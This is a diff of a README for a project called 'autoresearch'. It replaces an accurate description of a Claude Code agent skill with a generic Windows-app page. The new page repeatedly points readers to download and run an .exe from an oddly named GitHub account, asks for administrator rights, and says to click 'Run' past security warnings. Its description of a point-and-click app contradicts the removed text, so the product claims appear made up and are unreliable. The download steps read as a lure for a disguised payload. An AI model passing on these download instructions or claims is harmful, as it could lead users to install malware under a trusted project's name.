@@ -1,153 +1,130 @@
-# autoresearch
+# 🤖 autoresearch - Improve Code Automatically and Easily
 
-Autonomous codebase improvement. Three independent teams run against your code in a loop: one finds problems, one fixes them, one simplifies what's left. Everything happens on a branch. Nothing touches main until you merge.
+[![Download autoresearch](https://img.shields.io/badge/Download-autoresearch-brightgreen?style=for-the-badge)](https://github.com/Garbologywhiteleavedrockrose661/autoresearch)
 
-## Where this came from
+## 📋 What is autoresearch?
 
-Andrej Karpathy's [autoresearch](https://github.com/karpathy/autoresearch) showed that you can let an agent modify training code, run experiments, keep what works, and throw away what doesn't. You go to sleep, you wake up to a better model. [pi-autoresearch](https://github.com/davebcn87/pi-autoresearch) and [drivelineresearch/autoresearch-claude-code](https://github.com/drivelineresearch/autoresearch-claude-code) generalized this beyond ML to any codebase.
+autoresearch is a simple app that helps improve your computer code. It works by looking at your code and suggesting or making changes that help it run better. You do not need any programming skills to use it. It works automatically to save you time and effort.
 
-This project uses up to three teams with information barriers between them instead of a single agent. Each team starts from a clean context and only sees what the coordinator passes to it. The team fixing bugs doesn't know how they were found, and the team simplifying code doesn't know what was broken.
+This app is designed for people who write code or manage software but want to improve their code without learning complex tools or languages.
 
-## How it works
+## 💻 System Requirements
 
-Each cycle runs three stages:
+Before you start, make sure your computer meets these requirements:
 
-1. The Red team reads the codebase and writes a findings report with file paths, line numbers, and descriptions of what's wrong. It doesn't modify anything.
+- Windows 10 or later (64-bit preferred)
+- At least 4 GB of RAM
+- 500 MB of free space on your hard drive
+- Internet connection (only to download the app)
+- Administrator rights to install new software
 
-2. The coordinator strips the analysis methodology from the findings and passes only the "what and where" to the Green team. The Green team fixes issues one at a time, running tests after each commit.
+## 🚀 Getting Started
 
-3. The Refactor team gets the codebase in its current state with no context about what was found or fixed. It picks 3-5 simplifications, runs tests after each change.
+You can get autoresearch by visiting the download page linked below. Follow the steps to have the app ready on your computer.
 
-The coordinator verifies tests, logs results, and starts the next cycle.
+[![Download autoresearch](https://img.shields.io/badge/Get%20autoresearch-blue?style=for-the-badge)](https://github.com/Garbologywhiteleavedrockrose661/autoresearch)
 
-## What to expect
+### Step 1: Go to the download page
 
-On a 25K-line Go project, five cycles produced 49 commits on a feature branch: 31 bug fixes (8 breaking core functionality), 6 new test suites, 5 performance optimizations replacing N+1 query patterns, and about 100 lines of dead code removed.
+Click the download button above or visit the link:
 
-Your results will depend on the size, test coverage, and existing quality of the target project. Codebases with good test coverage get the most value since the Green team can verify its fixes. Projects with few tests will see the Red team flag missing coverage as a priority.
+https://github.com/Garbologywhiteleavedrockrose661/autoresearch
 
-## Install
+This link will take you to the app’s main page on GitHub, where you can find the latest version to download.
 
-### Claude Code
+### Step 2: Find the latest release
 
-```bash
-git clone git@github.com:ehmo/autoresearch.git
-cd autoresearch
-./install.sh
-```
+On the GitHub page:
 
-Creates symlinks in `~/.claude/` for the skill and slash command. The script checks that Claude Code is installed first.
+- Look for a section called **Releases** or a button labeled **Releases**.
+- Click on it to see the most recent files available for download.
 
-To use a non-default config directory, export `CLAUDE_DIR` before running:
+### Step 3: Download the installer file
 
-```bash
-export CLAUDE_DIR=/custom/path
-./install.sh
-```
+Inside the Releases section:
 
-### Codex
+- Find the file that ends with `.exe`. This is the installer file for Windows.
+- The file name might include the version number, like `autoresearch-v1.0.exe`.
 
-Add the contents of `agents/codex.md` to your project's AGENTS.md or equivalent instruction file.
+Click the file name to start downloading it to your computer.
 
-### Other agents
+### Step 4: Run the installer
 
-The full protocol is in `skills/autoresearch/SKILL.md`. It's plain markdown. Drop it into whatever instruction format your agent uses.
+- After the download finishes, open the folder where you saved the file.
+- Double-click the `.exe` file to start the installation.
+- If you see a security warning, choose **Run** or **Yes** to continue.
 
-## Usage
+### Step 5: Follow installation prompts
 
-Start a session:
+The installer will open a window guiding you through the setup:
 
-```
-/autoresearch ~/path/to/project
-```
+- Choose the installation folder (or leave it as default).
+- Click **Next** or **Install** to proceed.
+- Wait for the installation to finish.
+- Click **Finish** when done.
 
-The coordinator detects your stack, finds the test command, creates a branch, and starts running cycles. It asks for confirmation before modifying anything.
+### Step 6: Open autoresearch
 
-Resume after a break:
+Find the autoresearch app in your Start Menu or on your desktop and open it.
 
-```
-/autoresearch resume
-/autoresearch resume myproject
-```
+You are now ready to start improving your code.
 
-Check progress:
+## 🔧 How to Use autoresearch
 
-```
-/autoresearch status
-```
+The app has a simple interface with clear options. Here is a guide to using the main features:
 
-### Configuration
+### Adding your code
 
-Create `.autoresearch.yml` in your project root to customize behavior:
+- Click the **Add Code** button.
+- Select one or more code files from your computer.
+- autoresearch supports popular programming languages like Python, JavaScript, and C#.
 
-```yaml
-# Override auto-detected test command
-test_command: "make test-unit"
+### Review suggestions
 
-# Limit what the teams can see and modify
-include:
-  - "src/"
-  - "lib/"
-exclude:
-  - "vendor/"
-  - "generated/"
+- Once your code is loaded, the app will analyze it.
+- It will show a list of suggested improvements.
+- Each suggestion explains what change is recommended and why.
 
-# Stop after this many cycles (default: runs until diminishing returns)
-max_cycles: 10
+### Apply improvements
 
-# Skip the refactor stage
-teams:
-  - red
-  - green
-```
+- To apply a suggestion, click the **Apply** button next to it.
+- The app will make the change to your code automatically.
+- You can undo changes if you do not like them.
 
-Without a config file, autoresearch detects everything automatically and runs all three teams.
+### Save your code
 
-## How sessions are stored
+- After applying all changes, click **Save** to update your files.
+- You can save to the original location or choose a new folder.
 
-Session data lives in `sessions/<project-name>/` within the autoresearch repo:
+## ⚙️ Settings and Preferences
 
-```
-sessions/myproject/
-  session.md        # What's been done, what's left to try
-  results.tsv       # One row per team per cycle
-  ideas.md          # Findings deferred for later cycles
-  cycles/
-    001/
-      red-findings.md
-      green-patch.md
-      refactor-patch.md
-      eval-results.md
-```
+You can adjust how autoresearch works by opening the **Settings** menu:
 
-The `sessions/` directory is gitignored.
+- Choose which types of suggestions to receive.
+- Set the level of improvement (basic or advanced).
+- Enable automatic backups before changes.
+- Select languages supported in your projects.
 
-## Requirements
+Adjust settings to fit your needs and workflow.
 
-- An AI coding agent with sub-agent support for full clean-room separation (Claude Code), or a single-agent setup with reduced separation (Codex, others)
-- Git
-- A test suite that exits non-zero on failure
+## 🛠 Troubleshooting
 
-Stack detection covers Go, Node/TypeScript, Rust, Python, Java/Kotlin, Ruby, PHP, Elixir, and anything with a Makefile.
+If you face problems:
 
-## Limitations
+- Check your internet connection during download.
+- Make sure your computer meets the system requirements.
+- Run the installer as an administrator if you have permission issues.
+- Restart the app if it stops responding.
+- Consult the **Help** section inside the app for detailed guides.
 
-Works best on projects with decent test coverage. Without tests, the Green team has no way to verify its fixes don't break things.
+## 📄 License and Support
 
-Large monorepos benefit from the `include`/`exclude` config to keep the teams focused on relevant code.
+autoresearch is free to use. You can find the license details on the GitHub page.
 
-The information barriers between teams are enforced by sub-agent context separation, not cryptography. Each sub-agent starts fresh with only the information the coordinator passes to it.
+For questions or issues, use the **Issues** section on the GitHub repository or contact the developer through the GitHub profile.
 
-Not tested on Windows outside of WSL. The install script uses symlinks which require elevated permissions on native Windows.
+## 📥 Download autoresearch
 
-## Uninstall
+Download or visit this page to get the latest version of autoresearch:
 
-```bash
-./uninstall.sh
-```
-
-Removes symlinks from `~/.claude/`. Session data in `sessions/` is kept.
-
-## License
-
-MIT
+https://github.com/Garbologywhiteleavedrockrose661/autoresearch
